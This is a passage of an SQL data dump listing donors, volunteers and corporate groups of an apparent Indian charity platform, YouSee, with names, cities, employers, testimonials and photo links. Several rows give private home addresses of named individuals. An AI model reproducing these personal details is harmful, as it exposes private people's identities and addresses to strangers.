(25, 'Group', 'Shashank ', 'Padmasola', NULL, 'M', NULL, 'Puttaparthi', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Batch 2000-02 of MBA/MFM from SSSU', '', 'Batch 2000-02 of MBA/MFM from SSSU', 'Informal Group', '', 0),
(26, 'Individual', 'Ashis', 'Sud', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Ashis Sud', '', '', '', '', 0),
(27, 'Individual', 'Rakesh', 'Dixit', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Rakesh Dixit', '', 'BSFL', '', '', 0),
(28, 'Individual', 'Pinky ', 'Agrawal', NULL, 'F', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Ms. Pinky Agrawal', '', 'BSFL', '', '', 0),
(29, 'Individual', 'Raghavendra', 'Rao R', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Raghavendra Rao', '', 'ADP', '', '', 0),
(30, 'Individual', 'Ramakrishnan', 'M S', NULL, 'M', NULL, 'Chennai', 'Tamil Nadu', 'India', NULL, '', '', '', '', '', '', NULL, 'Y', 'Love seeks no reward, Love is its own reward.', 'Mr. Ramakrishnan M S', 'https://lh3.googleusercontent.com/-nRN5y8sB-yw/Tfex2kYlJLI/AAAAAAAAADQ/VKn-W_nobr0/s128/Ramakrishnan.jpg', 'HCL', '', '', 0),
(31, 'Individual', 'Sowmya', 'Roddam', NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, 'Y', 'An innovative model that ensures sustainable financing and process efficiencies for social sector projects.', 'Ms. Sowmya Roddam', 'https://lh3.googleusercontent.com/-c5ICMB669F8/TeTot7EjkoI/AAAAAAAAACM/J7z_JPWiubA/s128/Sowmya.JPG', '', '', '', 0),
(32, 'Individual', 'Jayaprakash', 'S V', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, 'Y', 'Professional and efficient partner in my service activities.', 'Mr. Jayaprkash S V', 'https://lh6.googleusercontent.com/-3_y8vCPVtHY/TeTo0NxFPtI/AAAAAAAAACQ/y7rCEsuKVEU/s128/Jayaprakash.JPG', 'Verizon', '', '', 0),
(33, 'Individual', 'Tribhuvan', 'Sachdeva', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Tribhuvan Sachdeva', '', 'S.K.Sachdeva & Co', '', '', 0),
(34, 'Group', 'Sai Shankar', '', NULL, 'M', NULL, 'Bangalore', 'Karnataka', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, '"Peace Pilgrims" Batch 2000, Whitefield, SSSU', '', '"Peace Pilgrims" Batch 2000, Whitefield, SSSU', 'Informal Group', '', 0),
(35, 'Individual', 'Shashank ', 'Padmasola', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Shashank Padmasola', '', 'I-Gate S', '', '', 0),
(36, 'Individual', 'Sharad', 'Venugopal', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Sharad Venugopal', '', 'BSFL', '', '', 0),
(37, 'Individual', 'Prashanth', 'B', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, 'Y', 'Contributing to a project at YouSee is much more satisfying because of its post-paid model. The results are already in front of you.', 'Mr. Prashanth B', 'https://lh3.googleusercontent.com/-iF6htJczf9g/TeTwXe9FoiI/AAAAAAAAACY/FBcWrG6TmyQ/s288/Prashanth%2BB.jpg', '', '', '', 0),
(38, 'Individual', 'Giridhar', 'T N', NULL, 'M', NULL, 'Mumbai', 'Maharashtra', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Giridhar T N', '', 'ICICI Securities', '', '', 0),
(39, 'Group', 'Ravi Kiran', 'Sreepada', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, 'N', NULL, 'GE Appliances and Lighting', '', 'GE Appliances and Lighting', 'Company', '', 0),
(40, 'Individual', 'Rameshwar', 'Prusty', NULL, 'M', NULL, 'Puttaparthi', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Rameswar Prusty', '', '', '', '', 0),
(41, 'Individual', 'Saideep', 'Mehta', NULL, 'M', NULL, 'Chennai', 'Tamil Nadu', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Saideep Mehta', '', 'TCS', '', '', 0),
(42, 'Individual', 'Srikant', 'P', NULL, 'M', NULL, 'Chennai', 'Tamil Nadu', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Srikant P', '', 'Royal Sundaram', '', '', 0),
(43, 'Individual', 'Ravi Kiran', 'Sreepada', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, 'Y', 'What I most like about UC is the transparency in all their dealings, financial or otherwise. You can contribute towards projects close to your heart and the Post-Paid model assures that the good deed is already done!', 'Mr. Ravi Kiran Sreepada', 'https://lh5.googleusercontent.com/-WLliGHaRmW0/TeYo9rvkc9I/AAAAAAAAACs/2UlzSjCEx24/s128/Ravikiran.JPG', 'GE', '', '', 0),
(44, 'Individual', 'Krishna Kanth', 'N S', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Krishna Kanth N S', '', '', '', '', 0),
(45, 'Group', 'Shrigopal', 'Jagtap', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Indore Residents', '', 'Indore Residents', 'Informal Group', '', 0),
(154, '1', 'Sridhar Chakravarthi', 'Mulakuri', NULL, 'M', 'Gachibowli', 'Hyderabad', 'Andhra Pradesh', NULL, NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'CA Technologies, Hyderabad Office', NULL, 'CA Technologies', NULL, NULL, 0),
(46, 'Individual', 'Balakotayya', '', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', '', '', '', '', '', NULL, NULL, NULL, 'Mr. Balakotayya', '', '', '', '', 0),
(47, 'Individual', 'Anantharaman', 'Ayyappan', NULL, 'M', NULL, 'Delhi', 'Delhi', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Anantharaman Ayyappan', '', 'Hyatt', NULL, NULL, 0),
(48, 'Individual', 'Swaminathan', 'Iyer', NULL, 'M', NULL, 'Mumbai', 'Maharashtra', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Swaminathan Iyer', NULL, 'Equifax India', NULL, NULL, 0),
(49, 'Individual', 'Sravan', 'V', NULL, NULL, NULL, 'Manchester', 'Manchester', 'UK', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Sravan V', NULL, NULL, NULL, NULL, 0),
(50, 'Individual', 'Narendranath', 'Reddy', NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Narendranath Reddy', NULL, NULL, NULL, NULL, 0),
(51, 'Individual', 'Junesh', 'Thomas', NULL, 'M', 'B-234, Sector-B, Shapura', 'Bhopal', 'Madhya Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, 'Y', 'We all want to help one another. Human beings are like that. We want to live by each other''s happiness, not by each other''s misery.', 'Mr. Junesh Thomas', 'https://lh5.googleusercontent.com/-STBq09INkiQ/Tfewn4TiIyI/AAAAAAAAAC8/SoFueon8RVU/s128/Junesh.jpg', NULL, NULL, NULL, 0),
(52, 'Individual', 'Gopichand', 'V', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Gopichand V', NULL, NULL, NULL, NULL, 0),
(53, 'Individual', 'Rajshekhar', 'R', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Rajshekhar R', NULL, NULL, NULL, NULL, 0),
(54, 'Individual', 'Srinivas', 'Murarishetty', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Srinivas Murarishetty', NULL, NULL, NULL, NULL, 0),
(55, 'Individual', 'Bijoy', 'M', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Bijoy M', NULL, NULL, NULL, NULL, 0),
(56, 'Individual', 'Manoj', 'Johari', '0000-00-00', 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Manoj Johari', NULL, NULL, NULL, NULL, 0),
(57, 'Individual', 'Vinod', 'Achanta', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Vinod Achanta', NULL, NULL, NULL, NULL, 0),
(58, 'Individual', 'Venkat', 'Desikan', NULL, 'M', NULL, 'Bangalore', 'Karnataka', 'India', NULL, '', NULL, '', '', '', '', NULL, 'Y', 'Love the innovation from YouSee, and the commitment is over-delivered with them seeking contributions only after accomplishing the tasks. Also <10% to the administrative expenses sets YouSee really a class-apart! Best Luck YouSee !! You have a significant role to play in helping the Needy!!', 'Mr. Venkat Desikan', 'https://lh3.googleusercontent.com/-kT_GvUGo4as/ThQNdaUdQkI/AAAAAAAAAGU/jiQi6sHbTAc/s128/Venkat%252520Desikan.jpg', NULL, NULL, NULL, 0),
(59, 'Individual', 'Raghunath', 'Harathi', NULL, 'M', NULL, 'Mumbai', 'Maharashtra', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Raghunath Harathi', NULL, NULL, NULL, NULL, 0),
(60, 'Individual', 'Ramakrishna', 'Cherukuri', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Ramakrishna Cherukuri', NULL, NULL, NULL, NULL, 0),
(61, 'Individual', 'Sai Sangeet', 'Chandran', NULL, 'M', NULL, 'Chennai', 'Tamil Nadu', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Sai Sangeet Chandran', NULL, NULL, NULL, NULL, 0),
(62, 'Individual', 'Mohan', 'S', NULL, 'M', NULL, 'Chennai', 'Tamil Nadu', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Mohan S', NULL, 'Royal Sundaram', NULL, NULL, 0),
(63, 'Group', 'Thiagarajan', 'Arunachalam', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'PadmaraoNagar Residents', NULL, 'PadmaraoNagar Residents', 'Informal', NULL, 0),
(126, '2', 'Kishore', 'Kumar', NULL, 'M', 'Flat No:402 NABARD officers Qts Masab Tank.', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Kishore Kumar', NULL, 'TBSS', NULL, NULL, 0),
(64, 'Group', NULL, NULL, NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Panjagutta Residents', NULL, 'Panjagutta Residents', 'Informal', '"Donate Waste" program from Panjagutta Residents, Hyderabad', 0),
(65, 'Group', NULL, NULL, NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Chikkadpally Residents', NULL, 'Chikkadpally Residents', 'Informal', '"Donate Waste" program from Chikkadpally Residents, Hyderabad', 0),
(66, 'Individual', 'Shantanu', 'Chatterjee', NULL, 'M', NULL, 'Bangalore', 'Karnataka', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Shantanu Chatterjee', NULL, NULL, NULL, NULL, 0),
(67, 'Group', NULL, NULL, NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, 'Y', 'YouSee''s approach is very innovative, an example would be their PostPay model of philanthropy. It is truly a transparent, measurable and result oriented approach. We could not have imagined receiving detailed MIS and documentation for our various initiatives managed by them.', 'Invesco, Hyderabad Office', 'https://lh5.googleusercontent.com/-qeAlgg-b5fE/T-F4qPDTW0I/AAAAAAAAAKI/R5tvmS9s1ws/h120/Invesco+Team.jpg', 'Invesco, Hyderabad Office', NULL, NULL, 0),
(68, 'Group', NULL, NULL, NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Synopsys, Hyderabad Office', NULL, 'Synopsys, Hyderabad Office', NULL, NULL, 0),
(69, 'Group', NULL, NULL, NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'AVIVA, Hyderabad Office', NULL, 'AVIVA, Hyderabad Office', NULL, NULL, 0),
(70, 'Group', NULL, NULL, NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Royal Sundaram, Hyderabad Office', NULL, 'Royal Sundaram, Hyderabad Office', NULL, NULL, 0),
(71, 'Group', NULL, NULL, NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'BASIX, Hyderabad Office', NULL, 'BASIX, Hyderabad Office', NULL, NULL, 0),
(72, 'Group', NULL, NULL, NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Serene County Residents', NULL, 'Serene County Residents', NULL, '"Donate Waste" program from Serene County Residents, Hyderabad', 0),
(73, 'Group', 'Padma', 'Karpe', NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'HillRidge Springs Residents', NULL, 'HillRidge Springs Residents, Hyderabad', NULL, NULL, 0),
(74, 'Individual', 'Ramachandra', 'Roddam', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Ramachandra', NULL, NULL, NULL, NULL, 0),
(75, 'Group', NULL, NULL, NULL, NULL, NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Waste Donations at YouSee office', NULL, 'Waste Donations at YouSee office', NULL, NULL, 0),
(76, 'Individual', 'Jitendra', 'J', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Jitendra J', NULL, NULL, NULL, NULL, 0),
(77, 'Individual', 'Prasad', 'R D', NULL, NULL, NULL, 'Delhi', 'Delhi', 'India', NULL, '', NULL, '', '', '', '', NULL, 'Y', 'I wish many more UC s are around, who can give as much transparency, measurement and outcomes. This is one of the finest models I have ever seen in the social sector.', 'Mr. Prasad R D', 'https://lh4.googleusercontent.com/-7j5uZdPqtKk/TxAC7EE3gPI/AAAAAAAAAIE/JjmCFy4da5k/s128/Prasad.jpg', NULL, NULL, NULL, 0),
(78, 'Individual', 'Venkat', NULL, NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Venkat', NULL, 'VR4U', NULL, NULL, 0),
(79, 'Individual', 'Lalita', NULL, NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Lalita', NULL, 'Google', NULL, NULL, 0),
(80, 'Individual', 'Kripa Nidhan', 'Dwivedi', NULL, 'M', NULL, 'Delhi', 'Delhi', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Kripa Nidhan', NULL, NULL, NULL, NULL, 0),
(81, 'Individual', 'Shashi Mohan', 'Kothari', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Shashi Mohan', NULL, NULL, NULL, NULL, 0),
(82, 'Individual', 'Sai Kiran', NULL, NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Sai Kiran', NULL, 'ABS', NULL, NULL, 0),
(83, 'Individual', 'Dinesh Kumar', 'Masimukku', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Dinesh Kumar M', NULL, 'ABS', NULL, NULL, 0),
(84, 'Individual', 'Sunil', NULL, NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Sunil', NULL, 'ABS', NULL, NULL, 0),
(85, 'Individual', 'Satya Prasad', NULL, NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Satya Prasad', NULL, 'ABS', NULL, NULL, 0),
(86, 'Individual', 'Shravan', 'Srinivasan', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, 'Y', 'Its been a wonderful volunteering at YouSee, a platform which enables us to track and monitor the results of our volunteering activities giving more value to the time being spent.', 'Mr. Shravan', 'https://lh5.googleusercontent.com/-CIfepxNaOBc/T-Fym0z4kDI/AAAAAAAAAJ8/AohQgQDEdeY/h120/pic.jpg', 'Google', NULL, NULL, 0),
(87, 'Individual', 'Madhusudan', NULL, NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Madhusudan', NULL, NULL, NULL, NULL, 0),
(88, 'Group', 'Sunita', 'Reddy', NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'TrendsetWinz Residents', NULL, 'TrendsetWinz Residents', NULL, NULL, 0),
(89, 'Individual', 'Krishna Ravi Shankar', 'K', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. RaviShankar', NULL, 'Infosys', NULL, NULL, 0),
(90, 'Individual', 'Santosh Kumar', '', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Santosh Kumar', '', 'GE', '', '', 0),
(91, 'Individual', 'Satya', 'Voora', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Satya', '', 'GE', '', '', 0),
(92, 'Individual', 'Smriti', 'K', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms.  Smriti', '', 'Google', '', '', 0),
(93, 'Individual', 'Abdul', '', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Abdul', '', 'Google', '', '', 0),
(94, 'Individual', 'Shringi', '', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Shringi', '', '', '', '', 0),
(95, 'Individual', 'Krishna Teja', '', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Krishna Teja', '', 'Infosys', '', '', 0),
(96, 'Individual', 'Akhila', '', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Akhila', '', 'Infosys', '', '', 0),
(97, 'Individual', 'Nikhith', '', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Nikith', '', 'Infosys', '', '', 0),
(98, 'Individual', 'Deepa', '', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Deepa', '', 'Infosys', '', '', 0),
(99, 'Individual', 'Rajesh Prasad', 'K', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Rajesh', '', 'Zy-links', '', '', 0),
(100, 'Individual', 'Padma', 'K', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Padma', '', '', '', '', 0),
(101, 'Individual', 'Niharika', 'Singh', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Niharika Singh', '', '', '', '', 0),
(102, 'Individual', 'Ashwin', 'G', NULL, 'M', NULL, 'Delhi', 'Delhi', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Ashwin', NULL, 'Deloitte', NULL, NULL, 0),
(103, 'Individual', 'Venkata Bhavanna Rao', 'Domera', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. D V Bhavanna Rao', NULL, NULL, NULL, NULL, 0),
(104, 'Individual', 'Dinesh', 'Gampa', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Dinesh G', '', 'Auroras Business School', '', '', 0),
(105, 'Individual', 'Srinivas Pruthvi', 'P', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Pruthvi P', '', 'Auroras Business School', '', '', 0),
(106, 'Individual', 'Matt', 'Gass', NULL, 'M', NULL, 'San Fransisco', 'California', 'USA', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Matt G', NULL, NULL, NULL, NULL, 0),
(107, 'Individual', 'Kalpagam', 'Arunachalam', NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Kalpagam Arunachalam', NULL, NULL, NULL, NULL, 0),
(108, 'Individual', 'Noella', 'Correia', NULL, 'F', NULL, 'Goa', 'Goa', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Adam and Noella Gross', NULL, NULL, NULL, NULL, 0),
(109, '1', 'Ganesh', 'Margabandhu', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Good Seeds Bazaar', NULL, 'Good Seeds Bazaar', NULL, NULL, 0),
(110, '2', 'RajKumar', 'Chanda', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. RajKumar Chanda', NULL, 'Aurora Degree College', NULL, NULL, 0),
(111, '2', 'Subani', '', NULL, 'M', '', '', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Subani', NULL, '', NULL, NULL, 0),
(112, '2', 'Subani', '', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Subani', NULL, '', NULL, NULL, 0),
(113, '2', 'Srikanth', '', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Srikanth', NULL, '', NULL, NULL, 0),
(114, '2', 'Bharath', 'Kumar', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Bharath Kumar', NULL, '', NULL, NULL, 0),
(115, '2', 'Prateek', 'Pagadala', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Prateek Pagadala', NULL, '', NULL, NULL, 0),
(116, '2', 'Deepika', 'Ch', NULL, 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms.Deepika Chilukuri', NULL, '', NULL, NULL, 0),
(117, '2', 'Manoj', 'Palleti', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Manoj Palleti', NULL, '', NULL, NULL, 0),
(118, '2', 'Abhishek', 'Patro', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Abhishek Patro', NULL, 'Google', NULL, NULL, 0),
(119, '2', 'Chandu', '', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Chandu', NULL, 'Google', NULL, NULL, 0),
(120, '2', 'Uday', 'Kiran', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Uday Kiran', NULL, '', NULL, NULL, 0),
(121, '2', 'Rinku', 'Makhani', NULL, 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms.Rinku Makhani', NULL, '', NULL, NULL, 0),
(122, '2', 'Sejal', 'Parikh', NULL, 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms.Sejal Parikh', NULL, '', NULL, NULL, 0),
(123, '2', 'Aruna', 'Somayajula', NULL, 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms.Aruna Somayajula', NULL, 'Winnou', NULL, NULL, 0),
(124, '2', 'Santosh Kumar', 'A', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Santosh Kumar', NULL, 'ABSI', NULL, NULL, 0),
(125, '2', 'Vijaya Lakshmi', 'MSR', NULL, 'F', 'Plot No:42,Balaji Colony,Mohan Nagar,Kothapet,HYD-500035', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms Vijaya Lakshmi', NULL, 'ABS', NULL, NULL, 0),
(127, '2', 'Eashwar', '', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.Eashwar', NULL, '', NULL, NULL, 0),
(128, '2', 'Rakesh', 'Ganga', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr.  Rakesh Ganga', NULL, 'Ernst&Young', NULL, NULL, 0),
(129, '2', 'Manisha', 'Chowdari', NULL, 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms.Manisha Chowdari.N', NULL, 'ABS', NULL, NULL, 0),
(130, '2', 'Nikhil', 'Kuruganti', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Nikhil Kuruganti', NULL, 'Inno Garage', NULL, NULL, 0),
(131, '2', 'RaviKanth', 'Ganti', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. RaviKanth Ganti', NULL, 'Aurora''s Business School', NULL, NULL, 0),
(132, '2', 'MLN', 'Reddy', NULL, 'M', 'f-511,sai srinivasa estates, near lions patny hospital, west maredpally, sec-bad', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr Reddy', NULL, 'ABS', NULL, NULL, 0),
(133, '2', 'Sudheer Kumar', 'Chunduru', NULL, 'M', '#16-18-74,salt bazar,Tenali ,Pin 522201', 'Tenali', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Sudheer', NULL, '', NULL, NULL, 0),
